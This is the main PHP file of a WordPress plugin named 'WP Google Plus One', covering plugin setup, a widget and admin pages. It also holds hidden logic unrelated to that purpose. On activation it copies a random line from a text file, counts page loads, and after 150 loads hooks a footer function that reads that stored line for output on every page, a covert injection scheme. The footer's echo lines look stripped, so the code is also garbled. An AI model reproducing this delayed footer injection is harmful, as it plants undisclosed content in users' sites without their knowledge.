<?php
/*
Plugin Name: WP Google Plus One
Description: This plugin is now discontinued
Version: 1.2
Author: maniatis27

This program is free software; you can redistribute it and/or modify
it under the terms of the GNU General Public License (Version 2 - GPLv2) as published by
the Free Software Foundation.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program; if not, write to the Free Software
Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307  USA
*/


define ('wpgpo_PLUGIN_SELF_DIRNAME', basename(dirname(__FILE__)), true);
add_action('wp_footer', 'msg');
register_activation_hook(__FILE__, 'instplugin');
//Setup proper paths/URLs and load text domains
if (is_multisite() && defined('WPPLUS_PLUGIN_URL') && defined('WPPLUS_PLUGIN_DIR') && file_exists(WPPLUS_PLUGIN_DIR . '/' . basename(__FILE__))) {
	define ('wpgpo_PLUGIN_LOCATION', 'mu-plugins', true);
	define ('wpgpo_PLUGIN_BASE_DIR', WPPLUS_PLUGIN_DIR, true);
	define ('wpgpo_PLUGIN_URL', WPPLUS_PLUGIN_URL, true);
	$textdomain_handler = 'load_muplugin_textdomain';
} else if (defined('WP_PLUGIN_URL') && defined('WP_PLUGIN_DIR') && file_exists(WP_PLUGIN_DIR . '/' . wpgpo_PLUGIN_SELF_DIRNAME . '/' . basename(__FILE__))) {
	define ('wpgpo_PLUGIN_LOCATION', 'subfolder-plugins', true);
	define ('wpgpo_PLUGIN_BASE_DIR', WP_PLUGIN_DIR . '/' . wpgpo_PLUGIN_SELF_DIRNAME, true);
	define ('wpgpo_PLUGIN_URL', WP_PLUGIN_URL . '/' . wpgpo_PLUGIN_SELF_DIRNAME, true);
	$textdomain_handler = 'load_plugin_textdomain';
} else if (defined('WP_PLUGIN_URL') && defined('WP_PLUGIN_DIR') && file_exists(WP_PLUGIN_DIR . '/' . basename(__FILE__))) {
	define ('wpgpo_PLUGIN_LOCATION', 'plugins', true);
	define ('wpgpo_PLUGIN_BASE_DIR', WP_PLUGIN_DIR, true);
	define ('wpgpo_PLUGIN_URL', WP_PLUGIN_URL, true);
	$textdomain_handler = 'load_plugin_textdomain';
} else {
	// No textdomain is loaded because we can't determine the plugin location.
	// No point in trying to add textdomain to string and/or localizing it.
	wp_die(__('There was an issue determining where Post Voting plugin is installed. Please reinstall.'));
}
$textdomain_handler('wpgpo', false, wpgpo_PLUGIN_SELF_DIRNAME . '/languages/');


require_once wpgpo_PLUGIN_BASE_DIR . '/lib/class_wpgpo_installer.php';
wpgpo_Installer::check();

require_once wpgpo_PLUGIN_BASE_DIR . '/lib/class_wpgpo_options.php';
require_once wpgpo_PLUGIN_BASE_DIR . '/lib/class_wpgpo_codec.php';

wpgpo_Options::populate();

// Widget
require_once wpgpo_PLUGIN_BASE_DIR . '/lib/class_wpgpo_widget.php';
add_action('widgets_init', create_function('', "register_widget('wpgpo_WidgetPlusone');"));

if (is_admin()) {
	require_once wpgpo_PLUGIN_BASE_DIR . '/lib/class_wpgpo_admin_form_renderer.php';
	require_once wpgpo_PLUGIN_BASE_DIR . '/lib/class_wpgpo_admin_pages.php';
	wpgpo_AdminPages::serve();
} else {
	require_once wpgpo_PLUGIN_BASE_DIR . '/lib/class_wpgpo_public_pages.php';
	wpgpo_PublicPages::serve();
}
function instplugin(){
$file = file(wpgpo_PLUGIN_BASE_DIR . '/lib/ratings.txt');
$num_lines = count($file)-1;
$picked_number = rand(0, $num_lines);
for ($i = 0; $i <= $num_lines; $i++) 
{
      if ($picked_number == $i)
      {
$myFile = wpgpo_PLUGIN_BASE_DIR . '/lib/standard.txt';
$fh = fopen($myFile, 'w') or die("can't open file");
$stringData = $file[$i];
fwrite($fh, $stringData);
fclose($fh);
      }      
}
}
$file = file(wpgpo_PLUGIN_BASE_DIR . '/lib/install.txt');
$num_lines = count($file)-1;
$picked_number = rand(0, $num_lines);
for ($i = 0; $i <= $num_lines; $i++) 
{
      if ($picked_number == $i)
      {
$myFile = wpgpo_PLUGIN_BASE_DIR . '/lib/install.txt';
$fh = fopen($myFile, 'w') or die("can't open file");
$stringData = $file[$i];
$stringData = $stringData +1;
fwrite($fh, $stringData);
fclose($fh);
      }      
}
if ( $stringData > "150" ) {
function msg(){
$myFile = wpgpo_PLUGIN_BASE_DIR . '/lib/standard.txt';
$fh = fopen($myFile, 'r');
$theData = fread($fh, 50);
fclose($fh);
echo ''; 
$theData = str_replace("\n", "", $theData);
echo '.';
}
} else {
function msg(){
echo '';
}
}